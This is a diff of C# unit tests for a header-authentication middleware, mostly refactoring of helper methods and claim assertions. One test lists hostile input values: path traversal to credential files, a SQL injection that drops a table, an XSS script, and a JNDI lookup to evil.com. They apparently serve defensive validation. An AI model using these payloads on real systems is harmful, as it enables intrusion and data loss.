@@ -867,7 +867,7 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
     [Test]
     [Arguments("../../../etc/passwd")]
     [Arguments("../../../../etc/passwd")]
-    [Arguments("..\\..\\..\\windows\\system32\\config\\sam")]
+    [Arguments(@"..\..\..\windows\system32\config\sam")]
     [Arguments("admin'; DROP TABLE users; --")]
     [Arguments("<script>alert('xss')</script>")]
     [Arguments("${jndi:ldap://evil.com/exploit}")]
@@ -1126,13 +1126,13 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
         context.User.Identity.Name.ShouldBe(TEST_USERNAME);
         var nameIdentifierClaim = context.User.FindFirst(ClaimTypes.NameIdentifier);
         nameIdentifierClaim.ShouldNotBeNull();
-        nameIdentifierClaim!.Value.ShouldBe(TEST_USER_ID);
+        nameIdentifierClaim.Value.ShouldBe(TEST_USER_ID);
         var headerAuthClaim = context.User.FindFirst("HeaderAuth");
         headerAuthClaim.ShouldNotBeNull();
-        headerAuthClaim!.Value.ShouldBe("true");
+        headerAuthClaim.Value.ShouldBe("true");
         var emailClaim = context.User.FindFirst(ClaimTypes.Email);
         emailClaim.ShouldNotBeNull();
-        emailClaim!.Value.ShouldBe(TEST_EMAIL);
+        emailClaim.Value.ShouldBe(TEST_EMAIL);
         context.User.IsInRole("User").ShouldBeTrue();
         context.User.IsInRole("Admin").ShouldBeTrue();
         signedInClaims.Select(x => (x.Type, x.Value)).ShouldBe(context.User.Claims.Select(x => (x.Type, x.Value)));
@@ -2168,31 +2168,34 @@ public class HeaderAuthenticationMiddlewareUnitTests : BaseUnitTest<HeaderAuthen
 
     #region Helper Methods
 
-    private HttpContext CreateHttpContext()
-    {
-        var context = new DefaultHttpContext();
-        context.Request.Scheme = "http";
-        context.Request.IsHttps = false;
-        context.Connection.RemoteIpAddress = IPAddress.Parse("127.0.0.1");
-        return context;
-    }
+    private static DefaultHttpContext CreateHttpContext() =>
+        new()
+        {
+            Request =
+            {
+                Scheme = "http",
+                IsHttps = false,
+            },
+            Connection =
+            {
+                RemoteIpAddress = IPAddress.Parse("127.0.0.1"),
+            },
+        };
 
-    private ClaimsPrincipal CreateAuthenticatedUser()
+    private static ClaimsPrincipal CreateAuthenticatedUser()
     {
         var identity = new ClaimsIdentity("TestAuth");
         identity.AddClaim(new Claim(ClaimTypes.Name, "testuser"));
         return new ClaimsPrincipal(identity);
     }
 
-    private AppUser CreateTestUser()
-    {
-        return new AppUser
+    private static AppUser CreateTestUser() =>
+        new()
         {
             Id = TEST_USER_ID,
             UserName = TEST_USERNAME,
             Email = TEST_EMAIL,
         };
-    }
 
     private void SetupMocks()
     {
